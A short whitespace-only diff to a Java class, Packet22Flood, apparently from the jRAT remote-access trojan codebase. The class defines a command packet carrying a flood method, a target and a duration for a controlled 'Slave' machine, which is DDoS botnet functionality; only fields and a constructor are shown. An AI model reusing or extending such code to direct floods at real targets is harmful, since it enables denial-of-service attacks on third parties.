@@ -5,13 +5,12 @@ import java.io.DataOutputStream;
 import pro.jrat.Slave;
 import pro.jrat.common.Flood;
 
-
 public class Packet22Flood extends AbstractOutgoingPacket {
 
 	private Flood method;
 	private String target;
 	private int seconds;
-	
+
 	public Packet22Flood(Flood method, String target, int seconds) {
 		this.method = method;
 		this.target = target;
